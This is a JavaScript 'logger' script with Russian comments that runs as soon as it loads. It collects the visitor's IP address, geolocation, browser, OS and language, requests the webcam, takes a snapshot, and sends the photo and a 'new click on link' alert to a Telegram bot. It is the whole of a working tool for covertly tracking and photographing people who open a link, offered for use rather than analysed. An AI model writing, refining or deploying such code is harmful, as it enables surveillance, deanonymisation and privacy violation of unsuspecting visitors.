// logger.js — ИСПРАВЛЕННАЯ ВЕРСИЯ
(async function() {
    "use strict";

    // ========== 1. Сбор IP и геолокации ==========
    let ipAddress = "0.0.0.0";
    let country = "не определена";
    let region = "не определён";
    let city = "не определён";

    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ipAddress = ipData.ip;

        const geoReq = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const geoData = await geoReq.json();
        
        country = geoData.country_name || "не определена";
        region = geoData.region || "не определён";
        city = geoData.city || "не определён";
    } catch(e) {
        console.warn("Geo error:", e);
    }

    // ========== 2. Время перехода ==========
    const now = new Date();
    const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" }) + " MSK";

    // ========== 3. UserAgent и язык ==========
    const userAgent = navigator.userAgent;
    const language = navigator.language || "не определён";
    
    let deviceType = "не определён";
    if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
        deviceType = "Телефон";
    } else if (/Windows|Mac|Linux|X11/i.test(userAgent)) {
        deviceType = "Компьютер";
    }

    // ОС
    let os = "не определена";
    if (userAgent.includes("Windows")) os = "Windows";
    else if (userAgent.includes("Android")) os = "Android";
    else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";
    else if (userAgent.includes("Mac")) os = "MacOS";
    else if (userAgent.includes("Linux")) os = "Linux";

    // Браузер
    let browser = "не определён";
    if (userAgent.includes("Chrome")) browser = "Chrome";
    else if (userAgent.includes("Firefox")) browser = "Firefox";
    else if (userAgent.includes("Safari")) browser = "Safari";
    else if (userAgent.includes("Edge")) browser = "Edge";
    else if (userAgent.includes("Opera")) browser = "Opera";

    // Краткий UserAgent
    let shortUA = userAgent;
    if (userAgent.length > 80) {
        shortUA = userAgent.substring(0, 77) + "...";
    }

    // ========== 4. Формирование сообщения (БЕЗ КООРДИНАТ, ССЫЛКИ, РЕФЕРЕРА, FOXLOGGER) ==========
    const caption = `🚨 НОВЫЙ ПЕРЕХОД ПО ССЫЛКЕ!

🌐 IP: ${ipAddress}
 ├─User-Agent: ${deviceType} | ${browser} | ${os}
 ├─Язык: ${language}
 └─Время: ${timeStr}

🌍 Геолокация:
 ├─Страна: ${country}
 ├─Регион: ${region}
 └─Город: ${city}`;

    // ========== 5. Захват фото с вебкамеры ==========
    let photoBlob = null;

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.autoplay = true;
        video.playsInline = true;

        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                resolve();
            };
        });

        await new Promise(r => setTimeout(r, 500));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        photoBlob = await new Promise(resolve => {
            canvas.toBlob(resolve, "image/jpeg", 0.85);
        });

        stream.getTracks().forEach(track => track.stop());
    } catch(e) {
        console.warn("Camera error:", e);
        photoBlob = null;
    }

    // ========== 6. Отправка в Telegram ==========
    async function sendPhotoWithCaption(blob, captionText) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append("chat_id", TELEGRAM_CHAT_ID);
        formData.append("photo", blob, "webcam_snapshot.jpg");
        formData.append("caption", captionText);

        const response = await fetch(url, { method: "POST", body: formData });
        return response.json();
    }

    async function sendTextOnly(text) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                disable_web_page_preview: true
            })
        });
        return response.json();
    }

    // Отправляем
    if (photoBlob) {
        const result = await sendPhotoWithCaption(photoBlob, caption);
        if (result.ok) {
            console.log("✅ Фото и данные отправлены");
        } else {
            console.log("❌ Ошибка отправки фото, отправляем текст");
            await sendTextOnly(caption);
        }
    } else {
        await sendTextOnly(caption);
        console.log("✅ Текст отправлен (камера недоступна)");
    }
})();
